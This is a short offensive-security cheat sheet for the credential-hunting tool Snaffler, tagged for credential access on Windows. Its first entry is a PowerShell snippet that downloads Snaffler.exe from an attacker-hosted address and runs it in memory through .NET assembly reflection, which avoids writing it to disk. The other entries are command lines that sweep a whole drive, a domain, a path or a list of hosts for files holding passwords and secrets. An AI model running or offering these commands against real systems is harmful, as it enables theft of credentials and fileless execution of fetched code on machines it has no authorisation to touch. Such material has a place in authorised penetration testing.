# Snaffler

% snaffler, password hunting
#plateform/windows #target/local #cat/CREDENTIAL-ACCESS/CREDS_HUNT #tag/snaffler 



## assembly reflection
#cat/UTILS 
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://<local_ip>:<port|80>/<dl_snaffler_path>Snaffler.exe')
$asm = [System.Reflection.Assembly]::Load($data);
$vars = New-Object System.Collections.Generic.List[System.Object];
$vars.Add("-s");
$vars.Add("-i");
$vars.Add("c:\");
$vars.Add("-v");
$vars.Add("data");
$passed = [string[]]$vars.ToArray();
$asm.EntryPoint.Invoke($null, @(,$passed))
```
= dl_snaffler_path: windows/NetFramework_4.7_x64/

## Snaffler - full 
```
.\snaffler.exe -s -o snaffler.loga -v data
```

## Snaffler - domain 
```
.\snaffler.exe -d <domain_fqdn> -s -o snaffler.loga -v data
```

## Snaffler - path 
```
.\snaffler.exe -i <path|"c:\"> -s -o snaffler.log -v data
```

## Snaffler - hosts 
```
.\Snaffler.exe -n <host_list_comma_sep> -s -o snaffler.log -v data
```



